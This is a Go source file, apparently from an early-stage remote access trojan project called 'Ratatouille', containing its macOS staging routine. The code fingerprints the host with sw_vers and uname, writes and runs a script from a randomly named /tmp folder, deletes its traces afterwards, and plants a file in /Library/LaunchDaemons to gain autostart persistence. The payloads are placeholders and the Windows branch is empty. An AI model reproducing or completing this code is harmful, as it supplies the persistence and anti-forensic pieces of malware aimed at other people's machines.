package staging

import (
	"fmt"
	"jf/Ratatouille/utils"
	"os"
	"os/exec"
	"path/filepath"
)

func Stage(operatingSystem string) {
	// Staging of the RAT files

	// different Os needs different behaviour
	// list of operating systems:
	// darwin
	// linux
	// windows
	// freebsd
	// solaris ...
	fmt.Printf("Operating System: %s", operatingSystem)
	if operatingSystem == "darwin" {
		// staging for A
		//
		// find out more about the current os of Host
		getMacOSVersion()
		uname()

		// create random folder name and create folder under /tmp/randomFolderName
		randomFolderName := "Ratatouille-" + utils.RandomString(7)
		rootPath := fmt.Sprintf("/tmp/%s", randomFolderName)

		fileContent := `echo "Hello Friend"
echo "Fun Content"> /Library/LaunchDaemons/ratatouille.plist`

		os.MkdirAll(rootPath, os.ModePerm)

		file, err := os.Create(rootPath + "/script.sh")
		if err != nil {
			fmt.Println(err)
		}
		defer file.Close()
		file.WriteString(fileContent)

		cmd := exec.Command("sh", rootPath+"/script.sh")
		output, err := cmd.Output()
		if err != nil {
			fmt.Println(err)
		}
		fmt.Printf("%s\n", output)
		// cleanup after staging
		Clean(operatingSystem, rootPath)

		// now find location for autostart and see if i can create random files in it with this script
		launchDeamonPath := "/Library/LaunchDaemons/ratatouile.plist"
		file, err = os.Create(launchDeamonPath)
		if err != nil {
			fmt.Println(err)
		}
	template:=`
Some fun Content
`
		file.WriteString(template)
	}

	if operatingSystem == "windows" {
		// find out windows version
	}
}

func Clean(operatingSystem, rootPath string) {
	if operatingSystem == "darwin" {
		filesToRemove := make([]string, 0)
		err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				fmt.Println(err)
			}
			filesToRemove = append(filesToRemove, path)
			return nil
		})
		if err != nil {
			fmt.Println(err)
		}

		os.RemoveAll(rootPath)
		for _, file := range filesToRemove {
			fmt.Println(file)
		}
	}
}

func getMacOSVersion() {
	info, err := exec.Command("sw_vers").Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(info))

}
func uname() {
	info, err := exec.Command("uname", "-a").Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(info))
}
